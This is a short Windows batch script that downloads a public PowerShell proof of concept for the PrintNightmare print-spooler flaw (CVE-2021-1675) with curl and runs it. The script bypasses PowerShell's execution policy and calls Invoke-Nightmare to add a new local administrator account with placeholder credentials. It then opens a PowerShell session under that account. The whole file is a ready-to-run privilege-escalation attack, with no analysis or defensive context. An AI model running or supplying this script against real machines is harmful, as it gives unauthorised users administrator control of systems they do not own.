@echo off
curl "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1" -O "CVE-2021-1675.ps1"
powershell -ExecutionPolicy Bypass -Command "$user='USER_NAME'; $pass='PASS_WORD'; Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser $user -NewPassword $pass -DriverName asdriver; $securePass = ConvertTo-SecureString $pass -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $securePass; Start-Process powershell -Credential $credential"
